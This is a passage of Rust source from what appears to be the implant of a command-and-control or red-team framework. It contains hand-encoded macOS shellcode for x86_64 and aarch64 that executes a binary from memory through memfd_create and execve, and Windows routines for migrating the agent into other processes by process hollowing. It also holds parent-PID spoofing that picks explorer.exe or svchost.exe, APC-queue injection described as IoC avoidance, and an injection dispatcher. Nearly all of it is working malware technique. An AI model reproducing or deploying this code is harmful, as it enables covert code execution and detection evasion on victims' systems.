    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
    // sub rsp, 32 (path buffer)
    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]);
    // lea r8, [rsp+31] (point to last byte)
    code.extend_from_slice(&[0x4c, 0x8d, 0x44, 0x24, 0x1f]);
    // mov byte [r8], 0 (NUL terminator)
    code.extend_from_slice(&[0x41, 0xc6, 0x00, 0x00]);
    // mov rax, r12 (fd for itoa)
    code.extend_from_slice(&[0x4c, 0x89, 0xe0]);

    // itoa loop: convert fd to decimal digits right-to-left
    let itoa_loop_start = code.len();
    // dec r8
    code.extend_from_slice(&[0x49, 0xff, 0xc8]);
    // xor edx, edx
    code.extend_from_slice(&[0x31, 0xd2]);
    // mov ecx, 10
    code.extend_from_slice(&[0xb9, 0x0a, 0x00, 0x00, 0x00]);
    // div rcx (rax = quotient, rdx = remainder)
    code.extend_from_slice(&[0x48, 0xf7, 0xf1]);
    // add dl, 0x30 ('0')
    code.extend_from_slice(&[0x80, 0xc2, 0x30]);
    // mov [r8], dl
    code.extend_from_slice(&[0x41, 0x88, 0x10]);
    // test rax, rax
    code.extend_from_slice(&[0x48, 0x85, 0xc0]);
    // jnz .itoa_loop (back to itoa_loop_start)
    code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
    let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
    code[code.len() - 1] = loop_size.wrapping_neg();

    // Prepend "/dev/fd/" in reverse order (last char first)
    for &ch in &[0x2f, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
        // dec r8
        code.extend_from_slice(&[0x49, 0xff, 0xc8]);
        // mov byte [r8], ch
        code.extend_from_slice(&[0x41, 0xc6, 0x00, ch]);
    }

    // mov rdi, r8 (path pointer for execve)
    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);

    // === Step 4: execve(path, NULL, NULL) ===
    // xor esi, esi (argv=NULL)
    code.extend_from_slice(&[0x31, 0xf6]);
    // xor edx, edx (envp=NULL)
    code.extend_from_slice(&[0x31, 0xd2]);
    // mov rax, 0x2000000 + 59 (SYS_execve)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 59).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    // === Step 5: exit(1) fallback ===
    // mov edi, 1
    code.extend_from_slice(&[0xbf, 0x01, 0x00, 0x00, 0x00]);
    // mov rax, 0x2000000 + 1 (SYS_exit)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 1).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);

    code
}

/// macOS aarch64 memfd+execve shellcode.
/// Uses BSD syscall ABI: syscall number in x16, invoke via `svc #0x80`.
#[cfg(all(target_os = "macos", target_arch = "aarch64"))]
fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    let mut insts: Vec<u32> = Vec::new();

    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
    // sub sp, sp, #16 (space for empty string)
    insts.push(0xD10043FF);
    // str xzr, [sp] (NUL-terminated empty string)
    insts.push(0xF90003FF);
    // mov x0, sp (add x0, sp, #0)
    insts.push(0x910003E0);
    // movz x1, #1 (MFD_CLOEXEC)
    insts.push(0xD2800001);
    // movz x16, #518 (SYS_memfd_create, macOS 13+)
    insts.push(0xD28040D0);
    // svc #0x80
    insts.push(0xD4000001);
    // mov x11, x0 (save fd)
    insts.push(0xAA0003EB);

    // === Step 2: write(fd, binary_addr, binary_len) ===
    // mov x0, x11 (fd)
    insts.push(0xAA0B03E0);
    // mov x1, binary_addr
    aarch64_load_64(&mut insts, 1, binary_addr);
    // mov x2, binary_len
    aarch64_load_64(&mut insts, 2, binary_len as u64);
    // movz x16, #4 (SYS_write)
    insts.push(0xD2800090);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
    // sub sp, sp, #32 (path buffer)
    insts.push(0xD10083FF);
    // add x12, sp, #31 (point to last byte of buffer)
    insts.push(0x91007FEC);
    // strb wzr, [x12] (NUL terminator)
    insts.push(0x3900019F);
    // mov x0, x11 (fd for itoa)
    insts.push(0xAA0B03E0);
    // movz x13, #10 (divisor for decimal conversion)
    insts.push(0xD280014D);

    // itoa loop: convert fd to decimal digits right-to-left
    let itoa_start = insts.len();
    // sub x12, x12, #1
    insts.push(0xD100058C);
    // udiv x14, x0, x13 (quotient)
    insts.push(0x9AC00800 | (13u32 << 16) | 14u32);
    // msub x15, x14, x13, x0 (remainder = x0 - x14*x13)
    insts.push(0x9B200000 | (13u32 << 16) | (14u32 << 5) | 15u32);
    // add x15, x15, #0x30 (ASCII '0')
    insts.push(0x9100C1EF);
    // strb w15, [x12]
    insts.push(0x3900018F);
    // mov x0, x14 (quotient becomes next dividend)
    insts.push(0xAA0E03E0);
    // cbnz x0, itoa_start
    let back_offset = (insts.len() - itoa_start) as u32;
    let imm19 = (0x80000u32.wrapping_sub(back_offset)) & 0x7FFFF;
    insts.push(0xB5000000 | (imm19 << 5));

    // Prepend "/dev/fd/" in reverse order
    for &ch in &[0x2fu8, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
        // sub x12, x12, #1
        insts.push(0xD100058C);
        // movz w15, #ch
        insts.push(0x52800000u32 | ((ch as u32) << 5) | 15);
        // strb w15, [x12]
        insts.push(0x3900018F);
    }

    // mov x0, x12 (path pointer)
    insts.push(0xAA0C03E0);

    // === Step 4: execve(path, NULL, NULL) ===
    // movz x1, #0 (argv=NULL)
    insts.push(0xD2800001);
    // movz x2, #0 (envp=NULL)
    insts.push(0xD2800002);
    // movz x16, #59 (SYS_execve)
    insts.push(0xD2800770);
    // svc #0x80
    insts.push(0xD4000001);

    // === Step 5: exit(1) fallback ===
    // movz x0, #1
    insts.push(0xD2800020);
    // movz x16, #1 (SYS_exit)
    insts.push(0xD2800030);
    // svc #0x80
    insts.push(0xD4000001);

    // Convert instruction words to little-endian bytes
    insts.iter().flat_map(|i| i.to_le_bytes()).collect()
}

/// Emit movz/movk instruction sequence to load a 64-bit immediate into an
/// aarch64 register.
#[cfg(target_os = "macos")]
fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
    let mut first = true;
    for shift in (0..=48).step_by(16) {
        let imm16 = ((val >> shift) & 0xFFFF) as u16;
        if first {
            // movz xd, #imm16, LSL #shift
            insts.push(
                0xD2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
            );
            first = false;
        } else if imm16 != 0 {
            // movk xd, #imm16, LSL #shift
            insts.push(
                0xF2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
            );
        }
    }
    if first {
        // Value was zero; emit movz xd, #0
        insts.push(0xD2800000 | rd);
    }
}

#[cfg(windows)]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    // Read the current agent's own executable so we can re-inject ourselves.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let payload = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;

    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
    let process = unsafe { OpenProcess(access, 0, target_pid) };
    if process.is_null() {
        anyhow::bail!(
            "OpenProcess(pid={target_pid}) failed: {}",
            std::io::Error::last_os_error()
        );
    }

    let result = hollowing::inject_into_process(target_pid, &payload);
    unsafe { pe_resolve::close_handle(process) };
    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_processes_returns_at_least_self() {
        let procs = list_processes();
        assert!(!procs.is_empty(), "expected at least the test process");
        let me = std::process::id();
        assert!(
            procs.iter().any(|p| p.pid == me),
            "the current process ({me}) should be in the list"
        );
    }

    /// The ptrace migration path must reject obviously invalid PIDs (0 and the
    /// agent's own PID) without attempting a ptrace attach.  This tests the
    /// guard logic only — no real system process is touched.
    #[test]
    #[cfg(target_os = "linux")]
    fn migrate_rejects_invalid_pids() {
        // pid=0 is always invalid.
        let err_zero = migrate_to_process(0).unwrap_err();
        assert!(
            err_zero.to_string().contains("invalid migration target")
                || err_zero.to_string().contains("pid 0"),
            "pid=0 should be rejected; got: {}",
            err_zero
        );

        // Migrating into our own process is also rejected.
        let our_pid = std::process::id();
        let err_self = migrate_to_process(our_pid).unwrap_err();
        assert!(
            err_self.to_string().contains("invalid migration target")
                || err_self.to_string().contains("self"),
            "self-migration should be rejected; got: {}",
            err_self
        );
    }

    #[test]
    #[ignore]
    #[cfg(windows)]
    fn test_hollowing() {
        // This test is ignored because it's invasive, but can be run manually.
        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
        let _payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
        assert!(migrate_to_process(0).is_ok());
    }
}

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn get_spoof_parent_pid() -> Option<u32> {
    let procs = list_processes();
    if let Some(explorer) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("explorer.exe"))
    {
        return Some(explorer.pid);
    }
    if let Some(svchost) = procs
        .iter()
        .find(|p| p.name.eq_ignore_ascii_case("svchost.exe"))
    {
        return Some(svchost.pid);
    }
    None
}

#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    // Inject into the SUPPLIED pid by:
    //  1. Opening the target process with VM+thread permissions.
    //  2. Allocating RWX memory and writing the payload.
    //  3. Enumerating all threads of the target via TH32CS_SNAPTHREAD.
    //  4. Queuing the APC routine to each thread (they will fire when
    //     that thread next enters an alertable wait state).
    // The original implementation incorrectly spawned a *new* svchost.exe
    // instead of injecting into the supplied `pid`.
    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
    use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
    };

    unsafe {
        let hprocess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid);
        if hprocess.is_null() {
            return Err(anyhow::anyhow!(
                "apc_inject: OpenProcess(pid={}) failed: {}",
                pid,
                std::io::Error::last_os_error()
            ));
        }

        // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
        let remote_mem = VirtualAllocEx(
            hprocess,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            pe_resolve::close_handle(hprocess);
            return Err(anyhow::anyhow!(
                "apc_inject: VirtualAllocEx(pid={}) failed",
                pid
            ));
        }

        let mut written = 0usize;
        if WriteProcessMemory(
            hprocess,
            remote_mem,
            payload.as_ptr() as _,
            payload.len(),
            &mut written,
        ) == 0
        {
            pe_resolve::close_handle(hprocess);
            return Err(anyhow::anyhow!(
                "apc_inject: WriteProcessMemory(pid={}) failed",
                pid
            ));
        }

        // Flip from RW to RX — no write permission at execution time.
        let mut old_protect = 0u32;
        if VirtualProtectEx(
            hprocess,
            remote_mem,
            payload.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            log::warn!(
                "apc_inject: VirtualProtectEx to RX failed for pid={}, memory remains RW (not executable)",
                pid
            );
            // Continue anyway — the payload won't execute if the page isn't
            // executable, but at least we don't leak RWX pages.  The APC
            // simply won't fire successfully.
        }
        pe_resolve::close_handle(hprocess);

        // Snapshot all threads in the system, filter by owner pid, queue APC.
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err(anyhow::anyhow!(
                "apc_inject: CreateToolhelp32Snapshot failed"
            ));
        }

        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        let mut queued = 0u32;
        if Thread32First(snapshot, &mut entry) != 0 {
            loop {
                if entry.th32OwnerProcessID == pid {
                    let hthread = OpenThread(THREAD_SET_CONTEXT, 0, entry.th32ThreadID);
                    if !hthread.is_null() {
                        if QueueUserAPC(apc_routine, hthread, 0) != 0 {
                            queued += 1;
                        }
                        pe_resolve::close_handle(hthread);
                    }
                }
                if Thread32Next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        pe_resolve::close_handle(snapshot);

        if queued == 0 {
            return Err(anyhow::anyhow!(
                "apc_inject: no threads found in pid={} to queue APC into",
                pid
            ));
        }

        tracing::info!(
            "apc_inject: queued APC in {} thread(s) of pid {}",
            queued,
            pid
        );
        Ok(())
    }
}

#[cfg(windows)]
use crate::injection::InjectionMethod;

#[cfg(windows)]
pub fn select_and_inject(
    pid: u32,
    payload: &[u8],
    method: Option<InjectionMethod>,
) -> anyhow::Result<()> {
    let method = method.unwrap_or(InjectionMethod::NtCreateThread);
    log::info!("Dispatching injection using method: {:?}", method);
    crate::injection::inject_with_method(method, pid, payload)
}
